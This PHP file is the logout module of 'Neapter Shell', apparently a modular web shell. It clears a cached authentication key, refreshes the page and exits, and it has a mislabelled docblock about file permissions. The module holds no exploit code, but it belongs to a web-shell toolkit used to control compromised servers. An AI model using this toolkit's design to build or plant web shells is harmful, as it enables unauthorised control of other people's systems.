<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Zmienianie uprawnien dla pliku
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleLogout extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array(
            'logout',
            'quit',
            'exit'
        );
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.0 2016-06-06 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
exit, quit, logout - Wylogowanie z shella

    Użycie:
        logout
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        $sAuthKeyFile = $this->oUtils->getAuthFileKey();
        $sAuth = $this->oUtils->cacheGet($sAuthKeyFile);

        /**
         * Czy plik z autoryzacja istnieje
         */
        if ($sAuth) {
            $this->oUtils->cacheSet($sAuthKeyFile, '');
        }

        @header('Refresh:1;url=' . Request::getCurrentUrl());
        echo "See you (:\n";

        exit;
    }

}
